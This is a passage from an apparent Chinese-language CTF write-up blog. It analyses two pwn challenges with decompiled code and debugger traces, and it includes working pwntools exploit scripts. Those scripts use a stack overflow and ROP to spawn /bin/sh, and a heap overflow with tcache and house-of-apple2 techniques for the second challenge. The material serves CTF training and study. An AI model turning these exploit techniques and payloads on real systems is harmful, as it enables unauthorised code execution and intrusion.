class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      print(<span class="hljs-string">&quot;Nick: &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)read_FUN(<span class="hljs-number">0LL</span>, v3, <span class="hljs-number">223LL</span>) &gt; <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">break</span>;<br>      print(<span class="hljs-string">&quot;Invalid name, try again\n&quot;</span>);<br>    &#125;<br>    sub_1075(a1, a2);<br>    print(<span class="hljs-string">&quot;Color: &quot;</span>);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)read_FUN(<span class="hljs-number">0LL</span>, v4, <span class="hljs-number">223LL</span>) &gt; <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">break</span>;<br>    print(<span class="hljs-string">&quot;Invalid color, try again\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">8</span>) == <span class="hljs-number">1</span> )<br>      sub_1000(a2);<br>  &#125;<br>  sub_1722(v3);<br>  sub_1722(v4);<br>  *a2 = sub_1668(a1, v3);<br>  a2[<span class="hljs-number">1</span>] = v4;<br>  <span class="hljs-keyword">return</span> print(<span class="hljs-string">&quot;Battle begins!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000001462</span> ; __unwind &#123;<br>.text:<span class="hljs-number">0000000000001462</span>                 endbr64<br>.text:<span class="hljs-number">0000000000001466</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000001467</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">000000000000146</span>A                 mov     [rbp+var_18], rdi<br>.text:<span class="hljs-number">000000000000146</span>E                 mov     [rbp+var_20], rsi<br>.text:<span class="hljs-number">0000000000001472</span>                 mov     [rbp+var_28], rdx<br>.text:<span class="hljs-number">0000000000001476</span>                 mov     [rbp+var_30], rcx<br>.text:<span class="hljs-number">000000000000147</span>A                 mov     [rbp+var_38], r8<br>.text:<span class="hljs-number">000000000000147</span>E                 mov     [rbp+var_40], r9<br>.text:<span class="hljs-number">0000000000001482</span>                 mov     rax, [rbp+var_18]<br>.text:<span class="hljs-number">0000000000001486</span>                 mov     rdi, [rbp+var_20]<br>.text:<span class="hljs-number">000000000000148</span>A                 mov     rsi, [rbp+var_28]<br>.text:<span class="hljs-number">000000000000148</span>E                 mov     rdx, [rbp+var_30]<br>.text:<span class="hljs-number">0000000000001492</span>                 mov     r10, [rbp+var_38]<br>.text:<span class="hljs-number">0000000000001496</span>                 mov     r8, [rbp+var_40]<br>.text:<span class="hljs-number">000000000000149</span>A                 mov     r9, [rbp+arg_0]<br>.text:<span class="hljs-number">000000000000149</span>E                 syscall                 ; LINUX -<br>.text:<span class="hljs-number">00000000000014</span>A0                 mov     [rbp+var_8], rax<br>.text:<span class="hljs-number">00000000000014</span>A4                 mov     rax, [rbp+var_8]<br>.text:<span class="hljs-number">00000000000014</span>A8                 pop     rbp<br>.text:<span class="hljs-number">00000000000014</span>A9                 retn<br>.text:<span class="hljs-number">00000000000014</span>A9 ; &#125; <span class="hljs-comment">// starts at 1462</span><br></code></pre></td></tr></table></figure><p>其中sub_10FD的参数a1,a2都是mmap申请来的可读可写的地址。</p><p>整个程序没有一点技巧可言，纯粹的调试。在sub_10FD中我们发现存在223大小的栈溢出此时我们可以覆盖v4即可控制第二次输入失败以构造无限循环以及任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">sub_1000</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(v2, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v2));<br>  sub_17CB(*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(a1 + <span class="hljs-number">16</span>), v2);<br>  print(<span class="hljs-string">&quot;score: &quot;</span>);<br>  print(v2);<br>  <span class="hljs-keyword">return</span> print(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中sub_1075中的函数sub_1000可以为我们泄漏前面mmap申请的地址的内容，经过调试后我们发现泄漏的地址为mmap所申请的地址前四个字节相加然后去掉最高一个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C">  <span class="hljs-number">0x630466af208d</span>    shr    rax, <span class="hljs-number">0x10</span><br>  <span class="hljs-number">0x630466af2091</span>    add    eax, eax                        EAX =&gt; <span class="hljs-number">0xe794ee34</span> (<span class="hljs-number">0x73ca771a</span> + <span class="hljs-number">0x73ca771a</span>)<br>  <span class="hljs-number">0x630466af2093</span>    and    eax, <span class="hljs-number">0x1ffffffe</span>                 EAX =&gt; <span class="hljs-number">0x794ee34</span> (<span class="hljs-number">0xe794ee34</span> &amp; <span class="hljs-number">0x1ffffffe</span>)<br>  <span class="hljs-number">0x630466af2098</span>    mov    edx, eax                        EDX =&gt; <span class="hljs-number">0x794ee34</span><br>  <span class="hljs-number">0x630466af209a</span>    mov    rax, qword ptr [rbp - <span class="hljs-number">0x20</span>]     RAX, [<span class="hljs-number">0x7ffc12907060</span>] =&gt; <span class="hljs-number">0x73ca771ad020</span> ◂— <span class="hljs-number">0</span><br>► <span class="hljs-number">0x630466af209e</span>    mov    dword ptr [rax + <span class="hljs-number">0x10</span>], edx     [<span class="hljs-number">0x73ca771ad030</span>] &lt;= <span class="hljs-number">0x794ee34</span><br>  <span class="hljs-number">0x630466af20a1</span>    mov    rax, qword ptr [rbp - <span class="hljs-number">0x20</span>]     RAX, [<span class="hljs-number">0x7ffc12907060</span>] =&gt; <span class="hljs-number">0x73ca771ad020</span> ◂— <span class="hljs-number">0</span><br>  <span class="hljs-number">0x630466af20a5</span>    mov    rax, qword ptr [rax]            RAX, [<span class="hljs-number">0x73ca771ad020</span>] =&gt; <span class="hljs-number">0</span><br>  <span class="hljs-number">0x630466af20a8</span>    mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax        [<span class="hljs-number">0x7ffc12907078</span>] &lt;= <span class="hljs-number">0</span><br>  <span class="hljs-number">0x630466af20ac</span>    jmp    <span class="hljs-number">0x630466af20c8</span>              &lt;<span class="hljs-number">0x630466af20c8</span>&gt;<br></code></pre></td></tr></table></figure><p>如图此时泄漏出来的地址为0x794ee34，我们接收该地址如何将最高字节的0xe还原最后整体整除2即可得到mmap所申请的地址的前4个字节，而通过gdb得知该地址最后三位为0，由此我们只需要爆破1字节即可获得完整的mmap所申请到的地址，并且该地址与ld-linux-x86-64.so.2的偏移是固定的，所以我们现在可以利用ld-linux-x86-64.so.2中的ROP来完成程序流劫持。</p><p>由于泄漏地址会在栈造成破坏表现为需要覆盖返回地址后面的一个固定位置为1，所以我们不能通过原先的返回地址返回，但是由于函数的多层调用，所以我们可以通过栈更后面的返回地址劫持1字节返回到syscall的附近位置（此时需要ld-linux-x86-64.so.2中的ret语句），并且我们可以控制rbp为mmap申请的地址，利用第二次read的能力向mmap中写入数据即可控制所有需要的寄存器完成getshell。</p><p>由于存在爆破该脚本位十六分一的概率。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&quot;prospector.nc.jctf.pro&quot;, 1337)</span><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = gdb.debug(<span class="hljs-string">&quot;./pwn&quot;</span>,<span class="hljs-string">&quot;b *$rebase(0x11AB)&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-comment">#loadsym = &quot;loadsym ./libc.so.6.debug ./ld.debug /home/zlsf/LS/glibc-2.23\n&quot;</span><br><br>payload = <span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x48</span> + p32(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdbp(p,&quot;b *0x5555555551AB&quot;)</span><br>sea(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>reu(<span class="hljs-string">b&quot;: &quot;</span>)<br>buf_addr = (((<span class="hljs-built_in">int</span>(re(<span class="hljs-number">9</span>),<span class="hljs-number">10</span>) + <span class="hljs-number">0xE0000000</span>) // <span class="hljs-number">2</span>) &lt;&lt; (<span class="hljs-number">8</span>*<span class="hljs-number">2</span>)) + <span class="hljs-number">0xC000</span><br>ph(buf_addr,<span class="hljs-string">&quot;buf_addr&quot;</span>)<br><br>base = buf_addr + <span class="hljs-number">0x9000</span><br>pop_rax = base + <span class="hljs-number">0x15abb</span><br>ret = pop_rax + <span class="hljs-number">1</span><br>ph(ret,<span class="hljs-string">&quot;ret&quot;</span>)<br><br>payload = <span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x28</span> + p64(buf_addr) + p64(buf_addr+<span class="hljs-number">0x88</span>) + p64(pop_rax) + p64(buf_addr) + p64(ret)*<span class="hljs-number">8</span> + <span class="hljs-string">b&quot;\x82&quot;</span><br>sea(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(buf_addr+<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x3B</span>)<br>sea(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="jctfcoin"><a href="#jctfcoin" class="headerlink" title="jctfcoin"></a>jctfcoin</h3><p>libc版本：Ubuntu GLIBC 2.39-0ubuntu8.5</p><p>check:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">[*] <span class="hljs-string">&#x27;/home/zlsf/start/mypwn/just2025_03-20250806/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br></code></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1753</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter user index: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0xF</span> || !qword_4040[v1] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index or user does not exist.&quot;</span>);<br>  v3 = qword_4040[v1];<br>  <span class="hljs-keyword">do</span><br>    v2 = getchar();<br>  <span class="hljs-keyword">while</span> ( v2 != <span class="hljs-number">10</span> &amp;&amp; v2 != <span class="hljs-number">-1</span> );<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter new name: &quot;</span>);<br>  <span class="hljs-keyword">return</span> sub_12EE(v3 + <span class="hljs-number">16</span>, *(_QWORD *)(v3 + <span class="hljs-number">8</span>) + <span class="hljs-number">0x10</span>LL);<br>&#125;<br></code></pre></td></tr></table></figure><p>该题为堆题，sub_1753存在堆溢出可以覆盖下一个chunk的size字段造成堆块吞并。</p><p>这个题似乎加载了额外一个自定义的libc并在题目中使用过里面的函数，不过有点意义不明，我们不使用这些功能同样也能成功打通这道题。</p><p>该程序的add函数会额外给你加0x20堆块的大小，如果你申请的是0x20（0x31组）的堆块的话size位会变成0x51，利用这个机制我们可以申请个大块中间夹2个小块这样的形式，然后修改第1个大块将这4个堆块全部扔到unsortbin中，此时我们再申请第1个堆块大大小的堆块这样我们就能在第1个小块中show出libc地址，然后再一次性把2个小块作为一个堆块申请出来我们就能控制第二个小块的fd地址，此时我们能泄漏出heap基地址也同时能使用tcachebin attack劫持__IO_list_all为堆上的地址，最后攻击house of apple2即可getshell。</p><p>实测远程和本地的heap堆地址在计算偏移的时候会相差0x30，误差的位置在脚本上已标出为 #0x30。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pid</span>(<span class="hljs-params">process_name</span>):<br>    ps_output = subprocess.check_output([<span class="hljs-string">&#x27;ps&#x27;</span>, <span class="hljs-string">&#x27;-a&#x27;</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    lines = ps_output.splitlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> process_name <span class="hljs-keyword">in</span> line:<br>            pid = line.split()[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> pid.isdigit():<br>                <span class="hljs-keyword">return</span> pid<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbremote</span>(<span class="hljs-params">pid , name = <span class="hljs-string">&#x27;three&#x27;</span> , port = <span class="hljs-string">&#x27;10000&#x27;</span> , ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span></span>):<br>    os.system(<span class="hljs-string">&quot;gnome-terminal -- bash -c \&quot;docker exec -it &quot;</span> + name + <span class="hljs-string">&quot; gdbserver :&quot;</span> + port + <span class="hljs-string">&quot; --attach &quot;</span> + pid + <span class="hljs-string">&quot; \&quot;&quot;</span>)<br>    os.system(<span class="hljs-string">&quot;gnome-terminal -- bash -c \&quot;gdb -ex \\\&quot;target remote &quot;</span> + ip + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;\\\&quot; \&quot;&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    